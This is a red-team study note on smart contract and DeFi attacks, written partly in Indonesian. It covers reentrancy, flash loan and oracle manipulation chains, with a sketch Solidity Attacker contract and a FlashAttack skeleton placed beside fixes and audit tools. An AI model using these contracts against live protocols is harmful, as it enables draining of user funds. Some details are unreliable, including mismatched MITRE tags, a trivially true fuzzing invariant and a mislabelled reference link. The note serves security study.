---
title: Attack Perspective — Blockchain & Smart Contract (Red Team)
tags:
- attack
- red-team
- blockchain
- smart-contract
- reentrancy
- flash-loan
- defi
- exploit
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  - callout
---
# Blockchain & Smart Contract — Perspektif Penyerang

> Smart contract = code yang menahan uang — bug = langsung rugi. Red team: reentrancy, flash loan, oracle manipulation, front-running, governance attack, private key theft.

## 1. Attack Surface Smart Contract

| Vektor | MITRE ID | Teknik | Contoh Kasus | Evasion | Detection Gap |
|--------|----------|--------|--------------|---------|----------------|
| **Reentrancy** | T1190 | External call → re-enter before state update | DAO hack ($60M), Cream Finance | Tx = legit sequence | On-chain = post-fact analysis |
| **Flash Loan** | T1190 | Borrow → manipulate → repay in same tx | bZx, PancakeBunny | Atomic tx = no collateral | On-chain = post-fact |
| **Oracle Manipulation** | T1190 | Manipulate price feed → arbitrage | Harvest Finance ($34M) | Oracle = trusted source | Oracle audit = rare |
| **Integer Overflow** | T1190 | Arithmetic underflow → mint/steal | BatchOverflow (2018) | Overflow = silent | Solidity 0.8 = fixed, legacy = vulnerable |
| **Front-Running** | T1573 | Mempool watch → insert tx before victim | Sandwich attack | Mempool = public | MEV detect = rare |
| **Governance** | T1190 | Vote manipulation → malicious proposal | Beanstalk ($182M) | Proposal = legit process | Governance audit = rare |
| **Private Key** | T1552 | Key theft → drain wallet | Ronin bridge ($625M) | Key = valid auth | Key hygiene = human |
| **Access Control** | T1190 | Missing modifier → arbitrary call | Parity wallet hack | Function = public by default | Access audit = rare |
| **Delegatecall** | T1190 | delegatecall → arbitrary storage write | Parity multi-sig (2017) | delegatecall = legit opcode | Storage audit = rare |

## 2. Reentrancy Attack Chain

```
Target: Contract dengan external call + state update after call
  ├── withdraw() { balance = balances[msg.sender]; 
  ├── msg.sender.call.value(balance)();  ← external call
  └── balances[msg.sender] = 0; }  ← state update AFTER call
    ↓
Attacker Contract:
  ├── fallback() { if (still balance) { withdraw() again } }
  ├── Deposit 1 ETH → balance = 1
  ├── withdraw() → balance = 1 → call attacker
  ├── attacker fallback → withdraw() again → balance still 1 (not updated)
  ├── Repeat until contract drained
  └→ Drain all funds
    ↓
Modern: OpenZeppelin ReentrancyGuard → nonReentrant modifier
    ↓
Bypass: Read-only reentrancy (no state change) → oracle manipulation
```

## 3. Flash Loan Attack Chain

```
Prereq: Flash loan provider (Aave, dYdX, Uniswap V3)
    ↓
Chain (atomic):
  1. Borrow $10M (no collateral, repay same tx)
  2. Swap → manipulate liquidity pool price
  3. Arbitrage / liquidation / exploit
  4. Repay loan + fee
  └→ All in ONE transaction → atomic → no risk
    ↓
Example (PancakeBunny 2021):
  ├── Borrow BNB → swap → manipulate price
  ├── Mint bunny at inflated price → sell
  └→ Profit $40M → repay → tx atomic
    ↓
Evasion: Flash loan = legit DeFi primitive → no malicious pattern
```

## 4. Oracle Manipulation

```
Target: DeFi yang pakai on-chain price (pool reserve ratio)
    ↓
Attack:
  ├── Flash loan → large swap → pool reserve ratio shift
  ├── Price oracle = pool ratio → manipulated price
  ├── Liquidate/borrow at manipulated price
  └→ Repay → profit → flash loan repaid
    ↓
Mitigation: Chainlink (off-chain) → but:
  ├── TWAP (time-weighted) → manipulation window
  └→ L2 sequencer → oracle stale → exploit gap
```

## 5. Tool Stack

| Tool | Use |
|------|-----|
| **Slither** | Static analysis (vuln scan) |
| **Mythril** | Symbolic execution (reentrancy, overflow) |
| **Echidna** | Property-based fuzzing |
| **Foundry** | Test framework (fork mainnet, attack simulation) |
| **Hardhat** | Dev + test environment |
| **web3.py / ethers.js** | Interaction (attack script) |

## 6. Referensi
- Slither — https://github.com/crytic/slither
- Mythril — https://github.com/Consensys/mythril
- Echidna — https://github.com/crytic/echidna
- Smart Contract Attack Vectors — https://github.com/Consensys/ethereum-developer-tools-list
- DeFi Hack Analysis — https://rekt.news/

## Konkret — DeFi Exploit (Testable)

### Reentrancy (Classic)

```solidity
// Vulnerable pattern: external call sebelum state update
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount);
    // BUG: call sebelum balance update
    (bool ok,) = msg.sender.call{value: amount}("");
    require(ok);
    balances[msg.sender] -= amount;  // re-entered here
}

// Attack contract:
contract Attacker {
    function attack() external {
        target.withdraw(target.balance);
    }
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(target.balance);  // re-enter
        }
    }
}

// Fix: CEI pattern (Check-Effect-Interact)
// 1. Check balance
// 2. Update balance (effect)
// 3. External call (interact) — LAST
```

### Flash Loan Attack

```solidity
// 1. Borrow massive amount (no collateral)
// 2. Manipulate price oracle (pump via swap)
// 3. Trigger liquidation / arbitrage
// 4. Repay loan + keep profit

contract FlashAttack {
    function attack() external {
        // Borrow 10M USDC (flash)
        flashloan.borrow(10_000_000e6, this);
    }
    function callback(uint amount) external {
        // Manipulate price: large swap → USDC/Pair price spike
        uniswapRouter.swap(amount, ...);
        // Now borrow more (over-collateralized by inflated asset)
        lending.borrow(50_000 ether);
        // Dump inflated asset → return flash loan
        token.approve(flashloan, amount + fee);
    }
}
```

### Fuzzing Smart Contract (Echidna)

```bash
# 1. Write invariant test
contract TestContract {
    function echidna_balance() public view returns (bool) {
        return address(this).balance >= 0;
    }
}
// 2. Run Echidna
echidna-test TestContract.sol --contract TestContract --test-limit 10000
// 3. Output: sequence of transactions yang break invariant
```
---

audited
---
